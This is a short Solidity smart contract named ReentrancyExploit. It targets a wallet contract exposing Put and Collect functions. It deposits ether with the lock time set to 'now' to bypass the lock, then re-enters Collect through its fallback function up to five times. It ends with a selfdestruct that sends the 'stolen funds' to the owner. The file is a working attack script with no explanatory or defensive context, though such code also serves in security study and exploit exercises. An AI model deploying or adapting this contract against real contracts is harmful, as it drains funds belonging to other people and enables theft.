pragma solidity ^0.4.25;

interface IW_WALLET {
    function Put(uint _unlockTime) external payable;
    function Collect(uint _am) external;
}

contract ReentrancyExploit {
    IW_WALLET public vulnerable;
    address public owner;
    uint public attackCount;
    uint public withdrawAmount;

    constructor(address _target) public {
        vulnerable = IW_WALLET(_target);
        owner = msg.sender;
    }

    // Deposit funds and set unlockTime = now (bypass lock)
    function attackSetup() external payable {
        require(msg.sender == owner);
        require(msg.value >= 1 ether);
        vulnerable.Put.value(msg.value)(now); // unlockTime = now
        withdrawAmount = msg.value;
    }

    // Start the reentrancy attack
    function beginAttack() external {
        require(msg.sender == owner);
        vulnerable.Collect(withdrawAmount);
    }

    // Reentrancy entry point
    function() external payable {
        if (attackCount < 5) {
            attackCount++;
            vulnerable.Collect(withdrawAmount);
        }
    }

    // Drain stolen funds
    function withdraw() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}

